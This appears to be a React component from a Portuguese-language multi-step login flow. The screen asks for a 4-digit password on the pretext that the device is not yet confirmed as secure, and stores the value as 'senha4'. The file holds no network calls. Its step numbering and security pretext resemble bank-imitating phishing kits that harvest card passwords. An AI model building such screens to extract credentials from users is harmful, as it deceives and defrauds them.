import React from 'react'
import { useHistory } from 'react-router-dom';
import { TextField } from '@material-ui/core'
import { makeStyles } from '@material-ui/core/styles';
import iconAlert from '../Assets/Images/alert.png'
import './style.css'
import logo from '../Assets/Images/logo_white.png'
import Loader from '../Components/Loader';


const useStyles = makeStyles((theme) => ({
    root: {
        display: 'flex',
        flexWrap: 'wrap',
    },
    textField: {
        width: '77vw',
        textAlign: 'center',
    },
}));


const Step5 = ({ loginData, setLoginData, onCadastro }) => {

    const classes = useStyles()
    const [loading, setLoading] = React.useState(false)

    const history = useHistory()

    const onChangeSen4 = e => {
        // console.log(e.target.value)
        setLoginData({ ...loginData, senha4: e.target.value })
    }

    


    return loading
        ? <Loader />
        :
        <div className={classes.textField}>
            <img src={logo} className="logo" />


            <h3>VALIDAÇÃO</h3>
            <div className="alert-image">
                <img src={iconAlert} />
                <p>Este dispositivo ainda não foi confirmado como um dispositivo seguro. por este motivo é necessário que informe a senha de 4 dígitos.</p>
            </div>
            <div>
                <TextField
                    label="Senha de 4 dígitos"
                    id="margin-none"
                    onChange={onChangeSen4}
                    defaultValue=""
                    type="password"
                    className={classes.textField}
                    //   helperText="Some important text"
                    onInput={(e) => {
                        e.target.value = Math.max(0, parseInt(e.target.value)).toString().slice(0, 4)
                    }}
                />
            </div>
            <div>
                
                <button type="button" className="botaoLaranja" onClick={onCadastro}>CONFIRMAR</button>
            </div>
        </div>

}

export default Step5